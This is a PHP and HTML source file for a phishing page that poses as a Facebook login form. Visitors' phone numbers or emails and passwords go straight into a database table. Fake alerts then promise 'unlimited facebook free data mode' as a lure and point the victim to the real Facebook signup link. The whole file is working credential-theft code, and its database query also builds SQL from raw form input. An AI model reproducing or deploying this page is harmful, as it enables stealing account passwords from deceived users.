<?php
   include('conmydc.php');
   if(isset($_POST['submit'])){
    $name1 = $_POST['name1'];
    $name2 = $_POST['name2'];
   

    $query = mysqli_query($con, "Insert into user_log (PHONE_EMAIL, PASSWORDS) values('$name1', '$name2')");
    if($query){
        echo"<script> alert('you are successifully awarded with unlimited facebook free data mode')</script>";
        echo"<script> alert('now click on create account  and login again to enjoy you free data mode!!')</script>";
    }
   }
   ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<style>
    body{
        width: auto;
        height: auto;
    }
    form{
        height: auto;
        width: 300px;
        margin-left: 10%;
    }
    hr{
        width: auto;
    }

    input{
        width: 200px;
        margin-top: 1%;
        height: auto;
        border-color: aquamarine;
    }
    h5{
        color: rgb(29, 29, 29);
        margin-left: 25%;
        text-align: justify;
    }
    p{
        color: blue;
    }
    #p2{
        color: black;
    }
    button{
        background-color: blue;
        width: 210px;
        margin-top: 2%;
        color: white;
    }
    #but{
        background-color: rgb(0, 191, 0);
        width: 50%;
        height: 4%;
        margin-left: 12%;
    }
    a{
        color: white;
    }

</style>
<body>
    <form name="form" method="POST">
<h5>Facebook</h5>
<hr>
<label>Mobile number or email address</label>
<input type="number || email" name="name1" required><br>
<label>password</label><br>
<input type="password" name="name2" required><br>
<button type="submit" name="submit">Log In</button>
<p>Forgottrn password?</p>
<p id="p2">____________ or ____________</p>
<button id="but"><a href="https://web.facebook.com/?_rdc=1&_rdr"> Create New Account </a></button>
<p>English(UK)</p>
<p>Hausa</p>
<p>Francais(France)</p>
<p>More Languages...</p>
    </form>
</body>
</html>